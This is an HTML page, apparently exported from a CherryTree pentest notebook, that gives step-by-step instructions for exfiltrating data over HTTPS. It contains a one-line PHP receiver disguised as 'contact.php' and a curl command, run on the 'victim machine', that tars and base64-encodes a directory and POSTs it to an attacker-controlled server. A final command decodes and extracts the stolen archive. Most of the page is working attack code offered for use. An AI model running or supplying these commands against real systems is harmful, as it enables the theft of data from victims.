<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Exfiltration over HTTPS via POST Reques</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Exfiltration over HTTPS via POST Reques</h1><br/><strong><h3>Prerequisites</h3></strong><br />• own a webserver that is PHP-enabled and SSL certificate installed<br /><br />“POST” base64-encoded data over HTTPS to a PHP-based web server that is under our control.<br /><br />1. On our <span style="color:#ff0000;">attacker system</span>, we create a PHP file that will write data being received as a POST request, to a file called /tmp/datafolder.base64 on our system. We’ll call this file “contact.php” for additional obscurity. The contents of the PHP file should be the following, all on a single line:<br />    <div class="codebox"><pre><span style="color:#333333;font-weight:400">&lt;?php</span> file_put_contents<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">&#39;/tmp/datafolder.base64&#39;</span><span style="color:#ff9d00;font-weight:400">,</span> file_get_contents<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">&#39;php://input&#39;</span><span style="color:#ff9d00;font-weight:400">));</span> <span style="color:#333333;font-weight:400">?&gt;</span></pre></div><br /><br />2. From the <span style="color:#1e90ff;">victim machine</span>, we issue a curl command that will send a POST request consisting of the tar’d and base64-encoded data from the victims’ /tmp/datafolder directory. We send that POST request to our attacker controlled PHP web servers’ contact.php file over SSL which will write a copy of the base64-encoded tar archive to a /tmp/datafolder.base64 file on our attacker system:<br />    <div class="codebox"><pre>curl --data &quot;$(tar zcf - /tmp/datafolder | base64)&quot; https://<span style="color:#7f0044;font-weight:400">&lt;attacker_server&gt;</span>/contact.php</pre></div><br /><br />3. Our <span style="color:#ff0000;">attacker machine</span> has received the POST’d data, and written it to the /tmp/datafolder.base64 file. We decode it while redirecting the output to a datafolder.tar archive, and extract:<br />    <div class="codebox"><pre>cat /tmp/datafolder.base64 | base64 -d &gt; datafolder.tar &amp;&amp; tar xf datafolder.tar</pre></div></div>
</body>
</html>
